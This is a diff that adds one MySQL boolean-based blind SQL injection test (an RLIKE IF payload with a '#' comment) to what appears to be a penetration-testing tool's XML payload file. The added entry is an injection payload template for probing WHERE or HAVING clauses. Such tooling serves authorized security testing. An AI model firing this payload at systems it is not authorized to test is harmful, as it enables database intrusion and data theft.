@@ -552,6 +552,26 @@ Formats:
             <comparison>OR NOT [RANDNUM]=[RANDNUM1]</comparison>
         </response>
     </test>
+
+    <test>
+        <title>MySQL boolean-based blind - WHERE or HAVING clause (RLIKE - comment)</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>RLIKE IF([INFERENCE],[ORIGVALUE],0x28)</vector>
+        <request>
+            <payload>RLIKE IF([RANDNUM]=[RANDNUM],[ORIGVALUE],0x28)</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <comparison>RLIKE IF([RANDNUM]=[RANDNUM],[ORIGVALUE],0x28)</comparison>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
     <!-- End of boolean-based blind tests - WHERE or HAVING clause -->
 
 
